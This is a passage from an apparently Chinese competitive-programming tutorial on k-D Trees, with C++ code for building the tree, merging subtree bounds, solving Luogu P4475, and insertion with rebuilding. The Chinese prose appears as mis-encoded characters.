<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> K;<span class="comment">//æ’åºæ—¶çš„ç»´åº¦</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.d[K]&lt;b.d[K];<span class="comment">//æŒ‰ç¬¬Kç»´æ’åº</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span><span class="comment">//l,råˆ†åˆ«æ˜¯é›†åˆçš„è¾¹ç•Œ,kæ˜¯æ’åºæ—¶çš„ç»´åº¦</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    K=k;</span><br><span class="line">    <span class="built_in">nth_element</span>(ori+l,ori+mid,ori+r+<span class="number">1</span>,cmp);<span class="comment">//oriä¸ºç‚¹é›†</span></span><br><span class="line">    t[mid]=ori[mid];<span class="comment">//tä¸ºk-D Treeæ‰€ä½¿ç”¨çš„æ•°ç»„</span></span><br><span class="line">    t[mid].ls=<span class="built_in">build</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);<span class="comment">//k^1,åˆ‡æ¢ç»´åº¦ï¼Œäº¤æ›¿å»ºæ ‘</span></span><br><span class="line">    t[mid].rs=<span class="built_in">build</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">update</span>(mid);<span class="comment">//åˆå¹¶å­æ ‘ä¿¡æ¯ï¼Œåé¢ä¼šè®²</span></span><br><span class="line">    <span class="keyword">return</span> mid;<span class="comment">//è¿”å›èŠ‚ç‚¹ç¼–å·</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="å­æ ‘ä¿¡æ¯åˆå¹¶"><a href="#å­æ ‘ä¿¡æ¯åˆå¹¶" class="headerlink" title="å­æ ‘ä¿¡æ¯åˆå¹¶"></a>å­æ ‘ä¿¡æ¯åˆå¹¶</h4><p>æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦ç»´æŠ¤ <code>mx[i]</code> å’Œ <code>mn[i]</code> ï¼Œ å³è¯¥èŠ‚ç‚¹æ‰€ç®¡è¾–çš„ç¬¬ $i+1$ ç»´åæ ‡æå€¼ã€‚</p>
<p>å¯¹äº $2$ ç»´çš„ k-D Treeï¼Œ<code>(mx[0],mx[1]),(mn[0],mx[1]),(mx[0],mn[1]),(mn[0],mn[1])</code> è¿™å››ä¸ªç‚¹å¯ä»¥çœ‹ä½œè¯¥èŠ‚ç‚¹æ‰€ç®¡è¾–çŸ©å½¢çš„å››ä¸ªé¡¶ç‚¹ã€‚</p>
<p>åˆå¹¶èµ·æ¥æ¯”è¾ƒç±»ä¼¼äºçº¿æ®µæ ‘ï¼Œçœ‹ä»£ç ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ls=t[p].ls;</span><br><span class="line">    <span class="type">int</span> rs=t[p].rs;</span><br><span class="line">    t[p].sum=t[ls].sum+t[rs].sum+t[p].val;<span class="comment">//ç»´æŠ¤èŠ‚ç‚¹æƒå€¼å’Œï¼Œå¯èƒ½ä¼šç”¨åˆ°</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;K;i++)<span class="comment">//Kä¸ºæ‰€æœ‰ç‚¹çš„ç»´åº¦ï¼Œä¾‹å¦‚å¹³é¢ä¸Šçš„ç‚¹çš„Kå°±æ˜¯2</span></span><br><span class="line">    &#123;</span><br><span class="line">        t[p].mx[i]=t[p].mn[i]=t[p].d[i];<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">if</span>(ls)</span><br><span class="line">        &#123;</span><br><span class="line">            t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[ls].mx[i]);</span><br><span class="line">            t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[ls].mn[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rs)</span><br><span class="line">        &#123;</span><br><span class="line">            t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[rs].mx[i]);</span><br><span class="line">            t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[rs].mn[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¿™é‡Œæ¯”è¾ƒå®¹æ˜“å†™é”™ï¼Œéœ€è¦ç»†å¿ƒæ£€æŸ¥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mx[i]</code> å’Œ <code>mn[i]</code> éå¸¸å…³é”®ï¼Œåˆç†ä½¿ç”¨èƒ½æå¤§ä¼˜åŒ–æŸ¥è¯¢æ—¶çš„å¤æ‚åº¦ã€‚</p>
<p>ä¸‹é¢æ”¾ä¸€ä¸ªåªéœ€è¦å»ºæ ‘å’Œç®€å•çš„æŸ¥è¯¢çš„å°k-D Treeæ¨¡æ¿é¢˜</p>
<h4 id="æ´›è°·-P4475-å·§å…‹åŠ›ç‹å›½"><a href="#æ´›è°·-P4475-å·§å…‹åŠ›ç‹å›½" class="headerlink" title="æ´›è°· P4475 å·§å…‹åŠ›ç‹å›½"></a>æ´›è°· P4475 å·§å…‹åŠ›ç‹å›½</h4><p>ç»™å‡º $n$ ä¸ªäºŒå…ƒç»„ $(x,y)$ ï¼Œæ¯ä¸ªäºŒå…ƒç»„æœ‰ä¸€ä¸ªæƒå€¼ $h$ï¼Œç°æœ‰ $m$ æ¬¡è¯¢é—®ï¼Œæ¯æ¬¡ç»™å‡º $a,b,c$ï¼Œè¯¢é—®æ‰€æœ‰æ»¡è¶³ $ax+by\lt c$ çš„äºŒå…ƒç»„çš„æƒå€¼å’Œã€‚</p>
<p>é¢˜è§£ï¼š</p>
<p>æ¯ä¸ªäºŒå…ƒç»„å¯ä»¥æŠ½è±¡æˆå¹³é¢ä¸Šçš„ç‚¹ï¼Œä½¿ç”¨k-D Treeæ¥ç»´æŠ¤ï¼Œå»ºæ ‘å°±ä¸ç”¨è¯´äº†ï¼ŒæŠŠæƒå€¼å’Œç»´æŠ¤ä¸Šå°±è¡Œï¼Œç°åœ¨ä¸»è¦æ¥è¯´æŸ¥è¯¢ã€‚</p>
<p>æˆ‘ä»¬å·²ç»ç»´æŠ¤äº† <code>mx[i]</code> å’Œ <code>mn[i]</code> ï¼Œå¦‚æœå½“å‰èŠ‚ç‚¹ç®¡è¾–çš„çŸ©å½¢çš„å››ä¸ªé¡¶ç‚¹éƒ½æ»¡è¶³ $ax+by\lt c$ï¼Œè¯´æ˜è¯¥èŠ‚ç‚¹å­æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ»¡è¶³ $ax+by\lt c$ï¼Œç›´æ¥è¿”å›æƒå€¼å’Œå³å¯ï¼›å¦‚æœéƒ½ä¸æ»¡è¶³ï¼Œè¯´æ˜å­æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸æ»¡è¶³ï¼Œç›´æ¥è¿”å› $0$ã€‚å¦åˆ™å°±åƒçº¿æ®µæ ‘ä¸€æ ·ï¼Œé€’å½’å·¦å³å­æ ‘ç»Ÿè®¡ç­”æ¡ˆã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> tot=<span class="number">0</span>;</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mx[<span class="number">0</span>],t[x].mx[<span class="number">1</span>]);</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mn[<span class="number">0</span>],t[x].mn[<span class="number">1</span>]);</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mx[<span class="number">0</span>],t[x].mn[<span class="number">1</span>]);</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mn[<span class="number">0</span>],t[x].mx[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span>(tot==<span class="number">4</span>)<span class="keyword">return</span> t[x].sum;<span class="comment">//å½“å‰èŠ‚ç‚¹ç®¡è¾–çš„çŸ©å½¢æ»¡è¶³ ax+by&lt;c</span></span><br><span class="line">	<span class="keyword">if</span>(tot==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//éƒ½ä¸æ»¡è¶³</span></span><br><span class="line">	<span class="type">int</span> ans=<span class="number">0</span>;<span class="comment">//ansä¸ºç­”æ¡ˆ</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">check</span>(t[x].d[<span class="number">0</span>],t[x].d[<span class="number">1</span>]))ans+=t[x].val;<span class="comment">//è¯¥èŠ‚ç‚¹æ»¡è¶³ ax+by&lt;cï¼Œå…ˆåŠ ä¸Šè¿™ä¸ªèŠ‚ç‚¹çš„æƒå€¼</span></span><br><span class="line">	<span class="keyword">if</span>(t[x].ls)ans+=<span class="built_in">query</span>(t[x].ls);<span class="comment">//é€’å½’å·¦å­æ ‘</span></span><br><span class="line">	<span class="keyword">if</span>(t[x].rs)ans+=<span class="built_in">query</span>(t[x].rs);<span class="comment">//é€’å½’å³å­æ ‘</span></span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX=<span class="number">5e4</span>+<span class="number">4</span>;</span><br><span class="line"><span class="type">int</span> a,b,c,K;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		x=x*<span class="number">10</span>+(ch^<span class="number">48</span>);</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	x*=f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">5</span>];</span><br><span class="line">	<span class="type">int</span> mx[<span class="number">5</span>],mn[<span class="number">5</span>];</span><br><span class="line">	<span class="type">int</span> val,sum,ls,rs;</span><br><span class="line">&#125;ori[MAX],t[MAX];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.d[K]&lt;b.d[K];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a*x+b*y&lt;c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[x].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[x].rs;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[x].mx[i]=t[x].mn[i]=t[x].d[i];</span><br><span class="line">		<span class="keyword">if</span>(ls)</span><br><span class="line">		&#123;</span><br><span class="line">			t[x].mx[i]=<span class="built_in">max</span>(t[x].mx[i],t[ls].mx[i]);</span><br><span class="line">			t[x].mn[i]=<span class="built_in">min</span>(t[x].mn[i],t[ls].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(rs)</span><br><span class="line">		&#123;</span><br><span class="line">			t[x].mx[i]=<span class="built_in">max</span>(t[x].mx[i],t[rs].mx[i]);</span><br><span class="line">			t[x].mn[i]=<span class="built_in">min</span>(t[x].mn[i],t[rs].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	t[x].sum=t[ls].sum+t[rs].sum+t[x].val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="built_in">nth_element</span>(ori+l,ori+mid,ori+r+<span class="number">1</span>,cmp);</span><br><span class="line">	t[mid]=ori[mid];</span><br><span class="line">	<span class="keyword">if</span>(l&lt;mid)t[mid].ls=<span class="built_in">build</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;mid)t[mid].rs=<span class="built_in">build</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(mid);</span><br><span class="line">	<span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> tot=<span class="number">0</span>;</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mx[<span class="number">0</span>],t[x].mx[<span class="number">1</span>]);</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mn[<span class="number">0</span>],t[x].mn[<span class="number">1</span>]);</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mx[<span class="number">0</span>],t[x].mn[<span class="number">1</span>]);</span><br><span class="line">	tot+=<span class="built_in">check</span>(t[x].mn[<span class="number">0</span>],t[x].mx[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span>(tot==<span class="number">4</span>)<span class="keyword">return</span> t[x].sum;</span><br><span class="line">	<span class="keyword">if</span>(tot==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">check</span>(t[x].d[<span class="number">0</span>],t[x].d[<span class="number">1</span>]))ans+=t[x].val;</span><br><span class="line">	<span class="keyword">if</span>(t[x].ls)ans+=<span class="built_in">query</span>(t[x].ls);</span><br><span class="line">	<span class="keyword">if</span>(t[x].rs)ans+=<span class="built_in">query</span>(t[x].rs);</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m;</span><br><span class="line">	<span class="built_in">read</span>(n),<span class="built_in">read</span>(m);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">read</span>(ori[i].d[<span class="number">0</span>]),<span class="built_in">read</span>(ori[i].d[<span class="number">1</span>]),<span class="built_in">read</span>(ori[i].val);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> root=<span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">read</span>(a),<span class="built_in">read</span>(b),<span class="built_in">read</span>(c);</span><br><span class="line">		cout&lt;&lt;<span class="built_in">query</span>(root)&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="æ’å…¥é‡æ„"><a href="#æ’å…¥é‡æ„" class="headerlink" title="æ’å…¥é‡æ„"></a>æ’å…¥é‡æ„</h3><h4 id="æ’å…¥"><a href="#æ’å…¥" class="headerlink" title="æ’å…¥"></a>æ’å…¥</h4><p>ä¸Šé¢åªæ˜¯ç®€ç®€å•å•çš„é™æ€çš„å»ºæ ‘ï¼Œå¦‚æœæˆ‘è¦æ’å…¥ç‚¹ï¼Œä½ è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>é¦–å…ˆï¼Œç”±äºk-D Treeå…·æœ‰äºŒå‰æœç´¢æ ‘çš„å½¢æ€ï¼Œæ’å…¥çš„æ—¶å€™åªéœ€è¦å’Œ <strong>å½“å‰èŠ‚ç‚¹çš„å¯¹åº”ç»´åº¦åæ ‡</strong> ä½œæ¯”è¾ƒå³å¯ï¼Œå¦‚æœå°äºç­‰äºå½“å‰èŠ‚ç‚¹çš„ç¬¬ $d$ ç»´ï¼Œåˆ™èµ°å‘å·¦å­æ ‘ï¼Œå¦åˆ™èµ°å‘å³å­æ ‘ã€‚</p>
<p>ç»´åº¦çš„åˆ‡æ¢å’Œäº¤æ›¿å»ºæ ‘ä¸€æ ·ï¼Œ$1$ åˆ° $K$ è½®æµæ¥å³å¯ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæˆ‘è¦å°† $(5,0)$ æ’å…¥è¿™æ£µæ ‘ä¸­ã€‚</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/d067mp1y.png"></p>
<p>ä» $(2,3)$ å¼€å§‹ï¼Œæ¯”è¾ƒç¬¬ $1$ ç»´ï¼Œ$5\gt 2$ï¼Œèµ°å‘å³å­æ ‘ã€‚</p>
<p>åˆ°è¾¾ $(4,1)$ï¼Œæ¯”è¾ƒç¬¬ $2$ ç»´ï¼Œ$0\lt 1$ï¼Œèµ°å‘å·¦å­æ ‘ã€‚</p>
<p>åˆ°è¾¾ $(3,1)$ï¼Œæ¯”è¾ƒç¬¬ $1$ ç»´ï¼Œ$5\gt 3$ï¼Œèµ°å‘å³å­æ ‘ã€‚</p>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ’å…¥æ“ä½œå°±æˆåŠŸäº†ï¼Œå—ï¼Ÿ</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/wr9jnqi0.png"></p>
<p>å¦‚æœæˆ‘ç–¯ç‹‚æ’å…¥å‡ æ¬¡æç«¯çš„ç‚¹ï¼Œk-D Treeå°±æœ‰å¯èƒ½å˜æˆè¿™æ ·ï¼Œå±‚æ•°å°±ä¸å†æ˜¯ $\log n$ äº†ï¼Œè¿™æ—¶å€™è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ<strong>é‡æ„ï¼</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> &amp;p,node temp,<span class="type">int</span> k)</span><span class="comment">//kä¸ºæ¯”è¾ƒç»´åº¦</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)<span class="comment">//k-D Treeä¸­æ²¡è¿™ä¸ªç‚¹ï¼Œç›´æ¥æ’å…¥</span></span><br><span class="line">	&#123;</span><br><span class="line">		p=<span class="built_in">newnode</span>();<span class="comment">//ç»™ä¸ªæ–°çš„ç¼–å·</span></span><br><span class="line">		t[p]=temp;</span><br><span class="line">		t[p].rs=<span class="number">0</span>,t[p].ls=<span class="number">0</span>;<span class="comment">//è¿™æ­¥éå¸¸é‡è¦ï¼Œä¸ç„¶å·¦å³å„¿å­ä¿¡æ¯ä¼šæ··ä¹±</span></span><br><span class="line">		<span class="built_in">update</span>(p);<span class="comment">//ä¸Šä¼ ä¿¡æ¯</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp.d[k]&lt;=t[p].d[k])<span class="built_in">insert</span>(t[p].ls,temp,k^<span class="number">1</span>);<span class="comment">//æ’è¿›å·¦å­æ ‘</span></span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">insert</span>(t[p].rs,temp,k^<span class="number">1</span>);<span class="comment">//æ’è¿›å³å­æ ‘</span></span><br><span class="line">	<span class="built_in">update</span>(p);<span class="comment">//ä¸Šä¼ ä¿¡æ¯</span></span><br><span class="line">	<span class="built_in">check</span>(p,k);<span class="comment">//åˆ¤æ–­æ˜¯å¦å¤±è¡¡</span></span><br><span class="line">    <span class="comment">//æ³¨æ„è¦å…ˆupdate()å†check()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€ä¹ˆåˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ„ï¼Ÿç±»ä¼¼ <strong>æ›¿ç½ªç¾Šæ ‘</strong>ï¼ˆæ²¡å­¦è¿‡ä¹Ÿæ²¡å…³ç³»ï¼Œæˆ‘ä¹Ÿæ²¡å­¦è¿‡ï¼‰ï¼Œæˆ‘ä»¬å¼•å…¥ä¸€ä¸ª **å¹³è¡¡å› å­ $\alpha$ **ï¼Œå¦‚æœè¯¥èŠ‚ç‚¹çš„å·¦å­æ ‘æˆ–è€…å³å­æ ‘çš„å­æ ‘å¤§å°è¶…è¿‡æ•´é¢—å­æ ‘å¤§å°çš„ $\alpha$ å€ï¼Œå³ $sz[p]*\alpha&lt;max(sz[ls],sz[rs])$ï¼Œæˆ‘ä»¬å°±éœ€è¦è¿›è¡Œé‡æ„ï¼Œé€šå¸¸ $0.6\leq \alpha \leq0.9$ï¼Œä¸€èˆ¬å–ä¸­é—´å€¼ $0.75$ï¼Œå¯ä»¥æ ¹æ®å–œå¥½è‡ªå·±è°ƒã€‚</p>
<p>åœ¨ <code>update()</code> å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–ç»´æŠ¤å­æ ‘çš„å¤§å°ã€‚</p>
<h4 id="æš´åŠ›é‡æ„"><a href="#æš´åŠ›é‡æ„" class="headerlink" title="æš´åŠ›é‡æ„"></a>æš´åŠ›é‡æ„</h4><p>ç±»ä¼¼é™æ€å»ºæ ‘ï¼Œæˆ‘ä»¬æŠŠå¤±è¡¡çš„å­æ ‘æ‹æˆä¸€ä¸ªåºåˆ—ï¼Œé‡æ–°å¯¹å½“å‰å­æ ‘å»ºæ ‘ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span><span class="comment">//æ¯”è¾ƒçš„å‡½æ•°æœ‰æ‰€æ”¹å˜</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> t[a].d[K]&lt;t[b].d[K];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pia</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)<span class="keyword">return</span>;</span><br><span class="line">	<span class="built_in">pia</span>(t[p].ls);</span><br><span class="line">    g[++tot]=p;<span class="comment">//æŠŠå½“å‰èŠ‚ç‚¹æ·»åˆ°åºåˆ—ä¸­</span></span><br><span class="line">	<span class="built_in">pia</span>(t[p].rs);</span><br><span 